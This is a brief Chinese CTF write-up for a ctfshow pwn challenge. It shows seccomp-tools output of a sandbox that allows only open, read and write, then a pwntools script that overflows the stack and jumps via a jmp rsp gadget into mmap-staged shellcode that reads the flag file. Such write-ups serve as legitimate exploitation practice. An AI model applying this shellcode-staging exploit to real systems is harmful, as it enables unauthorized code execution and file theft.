# 挑战简介
可以尝试用ORW读flag flag文件位置为/ctfshow_flag

# 思路
首先要学会如何用seccomp-tools，所用来检测沙箱给予的权限

```
└─$ seccomp-tools dump ./pwn
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x08 0xc000003e  if (A != ARCH_X86_64) goto 0010
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x05 0xffffffff  if (A != 0xffffffff) goto 0010
 0005: 0x15 0x03 0x00 0x00000000  if (A == read) goto 0009
 0006: 0x15 0x02 0x00 0x00000001  if (A == write) goto 0009
 0007: 0x15 0x01 0x00 0x00000002  if (A == open) goto 0009
 0008: 0x15 0x00 0x01 0x0000003c  if (A != exit) goto 0010
 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0010: 0x06 0x00 0x00 0x00000000  return KILL

```

看的出来，只允许我们用orw  

找到mmap的映射地址，并找到rsp的jmp引用  

然后利用栈溢出，进行rop利用链的构造

```
from pwn import *
from LibcSearcher import *
context.log_level = "debug"

context(os='linux', arch='amd64', log_level='debug')

p = remote("pwn.challenge.ctf.show",28207)
elf = ELF('D:\edge 下载\pwn')

mmap_addr = 0x123000

jmp_rsp = 0x400a01

p.recvuntil(b'to do\n')

shellcode = asm(shellcraft.open("./ctfshow_flag"))

shellcode += asm(shellcraft.read(3, mmap_addr, 0x100))

shellcode += asm(shellcraft.write(1, mmap_addr, 0x100))

payload = flat([(asm(shellcraft.read(0, mmap_addr, 0x100)) + asm("mov rax,0x123000; jmp rax")).ljust(0x28,b'a'), jmp_rsp,asm("sub rsp,0x30; jmp rsp")])

p.sendline(payload)

p.sendline(shellcode) 

p.interactive()

```
